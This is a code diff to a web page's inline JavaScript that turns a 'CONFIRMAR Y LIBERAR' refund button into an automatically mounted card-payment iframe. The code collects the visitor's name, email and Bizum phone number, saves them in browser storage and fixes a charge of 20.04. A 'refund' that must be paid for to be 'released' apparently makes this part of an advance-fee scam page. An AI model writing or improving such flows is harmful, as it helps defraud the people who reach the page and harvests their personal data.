@@ -1139,69 +1139,64 @@
                     }
                 } catch(e) {}
 
-                var btns = document.querySelectorAll('button');
-                btns.forEach(function(b) {
-                    if (b.textContent.includes('CONFIRMAR Y LIBERAR')) {
-                        b.id = 'confirm-btn-' + Math.random().toString(36).substr(2, 9);
-
-                        b.addEventListener('click', function(e) {
-                            e.preventDefault();
-                            e.stopPropagation();
-
-                            var customerEmail = document.getElementById('refund-email') ? document.getElementById('refund-email').value.trim() : '';
-                            var customerName = document.getElementById('refund-name') ? document.getElementById('refund-name').value.trim() : '';
-                            var customerPhone = document.getElementById('refund-bizum') ? document.getElementById('refund-bizum').value.trim() : '';
-
-                            if (!customerName || !customerEmail || !customerPhone) {
-                                try {
-                                    var stored = JSON.parse(localStorage.getItem('userBizumFecha') || '{}');
-                                    customerName = customerName || stored.nome || '';
-                                    customerEmail = customerEmail || stored.email || '';
-                                    customerPhone = customerPhone || stored.chaveBizum || '';
-                                } catch(e) {}
-                            }
-
-                            if (!customerName || !customerEmail || !customerPhone) {
-                                alert('Por favor, rellena todos los campos de reembolso.');
-                                return;
-                            }
-
-                            try {
-                                sessionStorage.setItem('refundCheckoutFecha', JSON.stringify({
-                                    customerName: customerName,
-                                    customerEmail: customerEmail,
-                                    customerPhone: customerPhone,
-                                    amountCents: 2004
-                                }));
-                                var existing = {};
-                                try { existing = JSON.parse(localStorage.getItem('userBizumFecha') || '{}'); } catch(e) {}
-                                existing.nome = customerName;
-                                existing.email = customerEmail;
-                                existing.chaveBizum = customerPhone;
-                                localStorage.setItem('userBizumFecha', JSON.stringify(existing));
-                            } catch(e) {}
-
-                            mount3BInline(b);
-                        });
+                function getCustomerData() {
+                    var e = document.getElementById('refund-email') ? document.getElementById('refund-email').value.trim() : '';
+                    var n = document.getElementById('refund-name') ? document.getElementById('refund-name').value.trim() : '';
+                    var p = document.getElementById('refund-bizum') ? document.getElementById('refund-bizum').value.trim() : '';
+                    if (!e || !n) {
+                        try {
+                            var s = JSON.parse(localStorage.getItem('userBizumFecha') || '{}');
+                            e = e || s.email || '';
+                            n = n || s.nome || '';
+                            p = p || s.chaveBizum || '';
+                        } catch(err) {}
                     }
-                });
+                    return { email: e, name: n, phone: p };
+                }
 
                 function mount3BInline(btnEl) {
                     if (document.getElementById('checkout-3b-inline')) return;
                     var host = btnEl.parentElement || btnEl;
+                    var data = getCustomerData();
+                    try {
+                        sessionStorage.setItem('refundCheckoutFecha', JSON.stringify({
+                            customerName: data.name, customerEmail: data.email,
+                            customerPhone: data.phone, amountCents: 2004
+                        }));
+                    } catch(e) {}
                     var wrap = document.createElement('div');
                     wrap.id = 'checkout-3b-inline';
-                    wrap.style.cssText = 'width:100%;margin:12px 0;border-radius:14px;overflow:hidden;background:#fff;box-shadow:0 4px 18px rgba(0,0,0,0.08);';
+                    wrap.style.cssText = 'width:100%;margin:12px 0;border-radius:14px;overflow:hidden;background:transparent;';
                     var iframe = document.createElement('iframe');
                     iframe.id = 'checkout-3b-frame';
-                    iframe.src = '/checkout-3b/index.html';
+                    var qs = '?embed=1';
+                    if (data.email) qs += '&email=' + encodeURIComponent(data.email);
+                    if (data.name) qs += '&name=' + encodeURIComponent(data.name);
+                    iframe.src = '/checkout-3b/index.html' + qs;
                     iframe.setAttribute('allow', 'payment; storage-access');
-                    iframe.style.cssText = 'width:100%;height:720px;border:0;display:block;';
+                    iframe.style.cssText = 'width:100%;height:560px;border:0;display:block;background:transparent;';
                     wrap.appendChild(iframe);
-                    // Substitui o botão pelo checkout inline
                     host.replaceChild(wrap, btnEl);
-                    try { wrap.scrollIntoView({ behavior: 'smooth', block: 'center' }); } catch(e) {}
                 }
+
+                // Auto-mount: replace the "CONFIRMAR Y LIBERAR" button with the inline card form on page load
+                var mounted = false;
+                function tryAutoMount() {
+                    if (mounted) return;
+                    var btns = document.querySelectorAll('button');
+                    for (var i = 0; i < btns.length; i++) {
+                        var b = btns[i];
+                        if (b.textContent && b.textContent.indexOf('CONFIRMAR Y LIBERAR') !== -1) {
+                            mounted = true;
+                            mount3BInline(b);
+                            return;
+                        }
+                    }
+                }
+                tryAutoMount();
+                if (!mounted) setTimeout(tryAutoMount, 300);
+                if (!mounted) setTimeout(tryAutoMount, 1000);
+
 
             })();
         </script>
